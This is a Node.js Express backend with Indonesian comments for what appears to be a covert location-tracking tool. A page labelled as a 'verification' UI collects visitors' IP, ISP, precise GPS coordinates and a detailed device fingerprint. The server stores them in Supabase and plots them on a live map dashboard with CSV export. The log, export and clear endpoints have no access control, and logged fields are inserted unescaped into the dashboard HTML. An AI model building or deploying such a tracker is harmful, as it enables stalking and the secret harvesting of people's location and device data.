require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

// Helper deteksi IP klien yang sebenarnya
function extractClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || 'Unknown';
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Melayani file frontend statis
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

// Endpoint Halaman Utama (UI Verifikasi)
app.get(['/', '/index.html'], (req, res) => {
    const candidatePaths = [
        path.join(__dirname, 'index.html'),
        path.join(__dirname, 'public', 'index.html'),
        path.join(process.cwd(), 'index.html'),
        path.join(process.cwd(), 'public', 'index.html')
    ];

    for (const p of candidatePaths) {
        if (fs.existsSync(p)) {
            return res.sendFile(p);
        }
    }

    res.status(404).send('File index.html tidak ditemukan.');
});

// ==========================================
// 1. ENDPOINT STATUS & HEALTH
// ==========================================
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        supabaseConnected: db.isConfigured,
        timestamp: new Date().toISOString()
    });
});

app.get('/api/my-ip', (req, res) => {
    const clientIp = extractClientIp(req);
    res.json({
        ip: clientIp,
        userAgent: req.headers['user-agent'] || 'Unknown'
    });
});

// ==========================================
// 2. ENDPOINT UTAMA (DATA DARI UI)
// ==========================================
app.post('/api/location', async (req, res) => {
    try {
        const {
            ipInfo = {},
            coordinates = {},
            device = {},
            status = 'success',
            notes = ''
        } = req.body;

        const clientIp = extractClientIp(req);
        const resolvedIp = ipInfo.ip || clientIp;
        const userAgent = req.headers['user-agent'] || device.userAgent || 'Unknown';

        const logEntry = {
            id: 'LOG-' + Date.now(),
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('id-ID', { timeZoneName: 'short' }),
            clientIp,
            status,
            notes,
            ipData: {
                ip: resolvedIp,
                city: ipInfo.city || 'Tidak diketahui',
                region: ipInfo.region || 'Tidak diketahui',
                country: ipInfo.country || 'Tidak diketahui',
                postal: ipInfo.postal || '-',
                org: ipInfo.org || '-',
                loc: ipInfo.loc || '-'
            },
            coordinates: {
                latitude: coordinates && coordinates.latitude != null ? Number(coordinates.latitude) : null,
                longitude: coordinates && coordinates.longitude != null ? Number(coordinates.longitude) : null,
                accuracy: coordinates && coordinates.accuracy != null ? Number(coordinates.accuracy) : null,
                altitude: coordinates && coordinates.altitude != null ? Number(coordinates.altitude) : null,
                speed: coordinates && coordinates.speed != null ? Number(coordinates.speed) : null,
                mapsUrl: (coordinates && coordinates.latitude && coordinates.longitude)
                    ? `https://www.google.com/maps?q=${coordinates.latitude},${coordinates.longitude}`
                    : null
            },
            device: {
                userAgent,
                platform: device.platform || '-',
                language: device.language || '-',
                screen: device.screen || '-',
                gpu: device.gpu || '-',
                cores: device.cores || '-',
                memory: device.memory || '-',
                network: device.network || '-',
                battery: device.battery || null,
                timezone: device.timezone || '-'
            }
        };

        // Simpan ke Supabase (atau fallback)
        await db.saveLog(logEntry);

        // Cetak ringkasan di konsol
        console.log('\n================== [DATA BARU DITERIMA] ==================');
        console.log(`⏰ Waktu       : ${logEntry.localTime}`);
        console.log(`🌐 IP          : ${logEntry.ipData.ip} (${logEntry.ipData.city}, ${logEntry.ipData.country})`);
        console.log(`🏢 ISP / Org   : ${logEntry.ipData.org}`);
        if (logEntry.coordinates.latitude && logEntry.coordinates.longitude) {
            console.log(`📍 GPS Lat/Lon : ${logEntry.coordinates.latitude}, ${logEntry.coordinates.longitude}`);
            console.log(`🎯 Akurasi     : ±${Math.round(logEntry.coordinates.accuracy)} meter`);
            console.log(`🗺️  Google Maps : ${logEntry.coordinates.mapsUrl}`);
        } else {
            console.log(`📍 GPS         : Tidak tersedia / Izin ditolak (${status})`);
        }
        console.log('==========================================================\n');

        res.status(200).json({
            success: true,
            message: 'Data lokasi berhasil diterima dan disimpan ke Supabase.',
            id: logEntry.id
        });
    } catch (err) {
        console.error('Error in /api/location:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// 3. ENDPOINT RETRIEVAL & EXPORT
// ==========================================
app.get('/api/logs', async (req, res) => {
    try {
        const logs = await db.getLogs();
        res.json({
            total: logs.length,
            logs: logs
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/logs/export/csv', async (req, res) => {
    try {
        const logs = await db.getLogs();
        const headers = [
            'ID',
            'Waktu',
            'Status',
            'IP',
            'Kota',
            'Negara',
            'ISP',
            'Latitude',
            'Longitude',
            'Akurasi (Meter)',
            'Platform',
            'Resolusi Layar',
            'Link Maps'
        ];

        const escapeCsv = (str) => {
            if (str == null) return '""';
            return `"${String(str).replace(/"/g, '""')}"`;
        };

        const rows = logs.map(l => [
            escapeCsv(l.id),
            escapeCsv(l.localTime || l.timestamp),
            escapeCsv(l.status),
            escapeCsv(l.ipData ? l.ipData.ip : l.clientIp),
            escapeCsv(l.ipData ? l.ipData.city : ''),
            escapeCsv(l.ipData ? l.ipData.country : ''),
            escapeCsv(l.ipData ? l.ipData.org : ''),
            escapeCsv(l.coordinates ? l.coordinates.latitude : ''),
            escapeCsv(l.coordinates ? l.coordinates.longitude : ''),
            escapeCsv(l.coordinates ? l.coordinates.accuracy : ''),
            escapeCsv(l.device ? l.device.platform : ''),
            escapeCsv(l.device ? l.device.screen : ''),
            escapeCsv(l.coordinates ? l.coordinates.mapsUrl : '')
        ].join(','));

        const csvContent = [headers.join(','), ...rows].join('\n');
        res.setHeader('Content-Type', 'text/csv; charset=utf-8');
        res.setHeader('Content-Disposition', 'attachment; filename="tracking_logs.csv"');
        res.send(csvContent);
    } catch (err) {
        res.status(500).send('Error exporting CSV: ' + err.message);
    }
});

app.post('/api/logs/clear', async (req, res) => {
    try {
        const ok = await db.clearLogs();
        if (ok) {
            res.json({ success: true, message: 'Semua log berhasil dihapus.' });
        } else {
            res.status(500).json({ success: false, message: 'Gagal menghapus log.' });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// 4. ENDPOINT COMPATIBILITY (LEGACY)
// ==========================================
app.post('/log', async (req, res) => {
    const data = req.body;
    const clientIp = extractClientIp(req);

    const logEntry = {
        id: 'LOG-' + Date.now(),
        timestamp: new Date().toISOString(),
        localTime: new Date().toLocaleString('id-ID', { timeZoneName: 'short' }),
        clientIp,
        status: 'ip_only',
        ipData: {
            ip: data.ip || clientIp,
            city: data.city || 'Unknown',
            country: data.country || 'Unknown'
        },
        coordinates: {
            latitude: data.lat ? Number(data.lat) : null,
            longitude: data.lon ? Number(data.lon) : null,
            mapsUrl: (data.lat && data.lon) ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : null
        },
        device: {
            userAgent: req.headers['user-agent'] || 'Unknown'
        }
    };

    await db.saveLog(logEntry);
    res.json({ status: 'received', id: logEntry.id });
});

app.get('/log', async (req, res) => {
    const { lat, lon, gps_error } = req.query;
    const clientIp = extractClientIp(req);

    if (gps_error) {
        await db.saveLog({
            id: 'LOG-' + Date.now(),
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('id-ID', { timeZoneName: 'short' }),
            clientIp,
            status: 'gps_error',
            notes: 'User menolak izin lokasi atau GPS error.'
        });
        return res.send('GPS error noted');
    }

    if (lat && lon) {
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        await db.saveLog({
            id: 'LOG-' + Date.now(),
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('id-ID', { timeZoneName: 'short' }),
            clientIp,
            status: 'gps_received',
            coordinates: {
                latitude: Number(lat),
                longitude: Number(lon),
                mapsUrl
            }
        });
        return res.send('GPS coordinates saved');
    }

    res.status(400).send('Parameter tidak lengkap.');
});

// ==========================================
// 5. DASHBOARD MONITORING DENGAN PETA LEAFLET
// ==========================================
app.get('/dashboard', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Monitoring Lokasi & Tracking (Supabase + Vercel)</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #f8fafc; margin: 0; padding: 24px; color: #1e293b; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
        h1 { margin: 0; font-size: 24px; color: #0f172a; display: flex; align-items: center; gap: 8px; }
        .subtitle { margin: 4px 0 0; color: #64748b; font-size: 14px; }
        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
        .btn { background: #4f46e5; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; text-decoration: none; font-size: 13px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; transition: background 0.15s; }
        .btn:hover { background: #4338ca; }
        .btn-success { background: #059669; }
        .btn-success:hover { background: #047857; }
        .btn-danger { background: #dc2626; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-secondary { background: #64748b; }
        .btn-secondary:hover { background: #475569; }
        .card { background: white; border-radius: 12px; box-shadow: 0 1px 3px 0 rgba(0,0,0,0.1); border: 1px solid #e2e8f0; overflow: hidden; margin-bottom: 24px; }
        .card-header { padding: 14px 20px; border-bottom: 1px solid #e2e8f0; background: #fafafa; font-weight: 600; font-size: 15px; color: #334155; display: flex; justify-content: space-between; align-items: center; }
        #map { height: 380px; width: 100%; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid #e2e8f0; vertical-align: top; }
        th { background: #f8fafc; font-weight: 600; color: #475569; }
        tr:hover { background: #f1f5f9; cursor: pointer; }
        .tag-success { background: #dcfce7; color: #15803d; padding: 2px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; display: inline-block; }
        .tag-fail { background: #fee2e2; color: #b91c1c; padding: 2px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; display: inline-block; }
        .tag-ip { background: #e0f2fe; color: #0284c7; padding: 2px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; display: inline-block; }
        .empty { padding: 40px; text-align: center; color: #64748b; font-size: 14px; }
        .meta-text { color: #64748b; font-size: 11px; line-height: 1.4; margin-top: 2px; }
        .storage-badge { font-size: 12px; font-weight: 500; padding: 4px 10px; border-radius: 6px; background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>📡 Live Location Tracking Dashboard</h1>
            <p class="subtitle">Didukung oleh <strong>Vercel Serverless</strong> & <strong>Supabase PostgreSQL</strong></p>
        </div>
        <div class="btn-group">
            <button class="btn" onclick="fetchLogs()">🔄 Refresh</button>
            <a class="btn btn-success" href="/api/logs/export/csv" download>📥 Export CSV</a>
            <button class="btn btn-danger" onclick="clearLogs()">🗑️ Hapus Log</button>
            <a class="btn btn-secondary" href="/" target="_blank">🌐 Buka Halaman UI</a>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span>🗺️ Peta Sebaran Lokasi Pengunjung</span>
            <span id="storageStatus" class="storage-badge">⚡ Supabase Connected</span>
        </div>
        <div id="map"></div>
    </div>

    <div class="card">
        <div class="card-header">
            <span>📋 Riwayat Detail Log Masuk (<span id="totalLogs">0</span> entri)</span>
        </div>
        <div style="overflow-x: auto;">
            <table>
                <thead>
                    <tr>
                        <th>Waktu</th>
                        <th>Status</th>
                        <th>IP & Lokasi Jaringan</th>
                        <th>Koordinat GPS & Akurasi</th>
                        <th>Hardware & Perangkat</th>
                        <th>Peta Eksternal</th>
                    </tr>
                </thead>
                <tbody id="logTableBody">
                    <tr><td colspan="6" class="empty">Memuat data log...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map;
        let markersGroup;
        let markersMap = {};

        function initMap() {
            map = L.map('map').setView([-2.5489, 118.0149], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; OpenStreetMap contributors',
                maxZoom: 19
            }).addTo(map);
            markersGroup = L.featureGroup().addTo(map);
        }

        async function fetchLogs() {
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();
                const tbody = document.getElementById('logTableBody');
                document.getElementById('totalLogs').textContent = data.total || 0;
                
                if (!data.logs || data.logs.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="6" class="empty">Belum ada data log yang tersimpan di database.</td></tr>';
                    markersGroup.clearLayers();
                    return;
                }

                markersGroup.clearLayers();
                markersMap = {};
                let hasCoords = false;

                tbody.innerHTML = data.logs.map(log => {
                    let statusTag = '';
                    if (log.status === 'success' || log.status === 'gps_received') {
                        statusTag = '<span class="tag-success">✓ GPS Aktif</span>';
                    } else if (log.status === 'ip_only') {
                        statusTag = '<span class="tag-ip">ℹ Hanya IP</span>';
                    } else {
                        statusTag = '<span class="tag-fail">⚠ ' + log.status + '</span>';
                    }

                    const ipText = (log.ipData && log.ipData.ip) ? log.ipData.ip : log.clientIp;
                    const cityText = (log.ipData && log.ipData.city) ? (log.ipData.city + ', ' + (log.ipData.country || '')) : '-';
                    const ispText = (log.ipData && log.ipData.org) ? '<div class="meta-text">ISP: ' + log.ipData.org + '</div>' : '';

                    let coordsText = '-';
                    let mapsBtn = '-';

                    if (log.coordinates && log.coordinates.latitude && log.coordinates.longitude) {
                        const lat = log.coordinates.latitude;
                        const lon = log.coordinates.longitude;
                        hasCoords = true;

                        coordsText = '<strong>' + lat + ', ' + lon + '</strong>';
                        if (log.coordinates.accuracy) {
                            coordsText += '<div class="meta-text">Akurasi: ±' + Math.round(log.coordinates.accuracy) + 'm</div>';
                        }
                        mapsBtn = '<a class="btn btn-success" style="padding:4px 8px; font-size:11px;" href="' + log.coordinates.mapsUrl + '" target="_blank">Google Maps ↗</a>';

                        const marker = L.marker([lat, lon]).addTo(markersGroup);
                        marker.bindPopup(\`
                            <strong>📍 \${ipText}</strong><br>
                            \${cityText}<br>
                            Waktu: \${log.localTime || log.timestamp}<br>
                            Akurasi: ±\${log.coordinates.accuracy ? Math.round(log.coordinates.accuracy) : '?'}m<br>
                            <a href="\${log.coordinates.mapsUrl}" target="_blank">Buka di Google Maps</a>
                        \`);

                        if (log.coordinates.accuracy && log.coordinates.accuracy < 1000) {
                            L.circle([lat, lon], {
                                radius: log.coordinates.accuracy,
                                color: '#4f46e5',
                                fillColor: '#818cf8',
                                fillOpacity: 0.15
                            }).addTo(markersGroup);
                        }

                        markersMap[log.id] = marker;
                    }

                    const device = log.device || {};
                    const hwText = \`
                        <strong>\${device.platform || '-'}</strong>
                        <div class="meta-text">Layar: \${device.screen || '-'}</div>
                    \`;

                    return \`
                        <tr onclick="focusOnMap('\${log.id}')">
                            <td style="white-space: nowrap;">\${log.localTime || log.timestamp}</td>
                            <td>\${statusTag}</td>
                            <td><strong>\${ipText}</strong><br>\${cityText}\${ispText}</td>
                            <td>\${coordsText}</td>
                            <td>\${hwText}</td>
                            <td>\${mapsBtn}</td>
                        </tr>
                    \`;
                }).join('');

                if (hasCoords && markersGroup.getLayers().length > 0) {
                    map.fitBounds(markersGroup.getBounds().pad(0.1));
                }
            } catch (err) {
                console.error("Gagal mengambil log:", err);
            }
        }

        function focusOnMap(logId) {
            const marker = markersMap[logId];
            if (marker) {
                map.setView(marker.getLatLng(), 15);
                marker.openPopup();
            }
        }

        async function clearLogs() {
            if (!confirm('Apakah Anda yakin ingin menghapus semua data log dari Supabase?')) return;
            await fetch('/api/logs/clear', { method: 'POST' });
            fetchLogs();
        }

        window.onload = function() {
            initMap();
            fetchLogs();
            setInterval(fetchLogs, 5000);
        };
    </script>
</body>
</html>
    `);
});

// Jalankan server lokal jika bukan di environment Vercel
if (!process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log(`====================================================`);
        console.log(`🚀 Server Backend aktif di http://localhost:${PORT}`);
        console.log(`📄 Halaman UI Tracking   : http://localhost:${PORT}/index.html`);
        console.log(`📊 Dashboard Monitoring  : http://localhost:${PORT}/dashboard`);
        console.log(`📡 Supabase Status       : ${db.isConfigured ? '✅ Terhubung' : '⚠️  Belum dikonfigurasi (Local fallback)'}`);
        console.log(`====================================================`);
    });
}

// Export aplikasi untuk Vercel Serverless Function
module.exports = app;
